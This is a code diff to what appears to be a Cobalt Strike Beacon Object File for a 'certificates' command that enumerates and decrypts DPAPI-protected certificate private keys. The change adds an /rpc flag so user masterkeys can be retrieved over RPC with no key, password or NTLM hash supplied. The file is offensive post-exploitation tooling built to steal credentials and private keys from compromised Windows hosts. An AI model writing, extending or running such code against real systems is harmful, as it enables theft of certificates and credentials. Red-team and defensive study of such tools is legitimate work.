@@ -4,7 +4,7 @@
  * Usage:
  *   certificates [/pvk:BASE64] [/password:PASSWORD] [/ntlm:HASH]
  *                [/credkey:KEY] [/target:PATH] [/server:SERVER]
- *                [/showall] [/machine]
+ *                [/showall] [/machine] [/rpc]
  *
  * Enumerates and decrypts DPAPI-protected certificate private keys.
  */
@@ -26,6 +26,7 @@ void go(char* args, int args_len) {
     char* server_str = BeaconDataExtract(&parser, NULL);
     int   show_all   = BeaconDataInt(&parser);
     int   machine    = BeaconDataInt(&parser);
+    int   use_rpc    = BeaconDataInt(&parser);
 
     BYTE* pvk = NULL;
     int pvk_len = 0;
@@ -72,11 +73,11 @@ void go(char* args, int args_len) {
         triage_system_certs(&cache, target, (BOOL)show_all);
     } else {
         /* User certificate triage */
-        if (pvk || password || ntlm) {
+        if (pvk || password || ntlm || use_rpc) {
             triage_user_masterkeys(&cache, pvk, pvk_len,
                 (password && strlen(password) > 0) ? password : NULL,
                 (ntlm && strlen(ntlm) > 0) ? ntlm : NULL,
-                NULL, FALSE, target, server, FALSE, NULL);
+                NULL, (BOOL)use_rpc, target, server, FALSE, NULL);
         }
 
         if (target) {
